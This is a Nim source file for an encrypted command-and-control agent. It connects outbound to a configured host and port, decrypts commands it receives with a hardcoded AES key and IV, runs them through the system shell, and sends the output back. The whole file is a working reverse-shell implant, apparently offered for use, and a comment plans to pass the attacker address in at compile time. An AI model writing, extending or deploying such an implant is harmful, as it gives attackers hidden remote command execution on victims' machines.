import net
import std/osproc
import aesCrypto
import httpClient

var passedKey: string = "My Passkey"
var passedIV: string = "1234567890ABCDEF"

# Default Status, eventually want to pass these in as compile time arguments

let ipAddress: string = "127.0.0.1"
let portNum: int = 5454

# We need to connect outbound
let client: Socket = newSocket()
client.connect(ipAddress, Port(portNum))
stdout.writeLine("Agent: connected to server on address " & ipAddress  & ":5454")



while true:
  let encCommand: string = client.recvLine()

  let command = decryptStr(encCommand, passedKey, passedIV)

  if command == "":
      break

  stdout.writeLine("Agent: received command: ", command)

  try:
    let response: string = execProcess(command)
    stdout.writeLine("Agent: command output: ", response)
    client.send(response & "\n")

  except IOError:
    client.send("IOError\r\L")
  except OSError:
    client.send("OSError\r\L")
  except:
    client.send("Unknown Exception")

client.close()
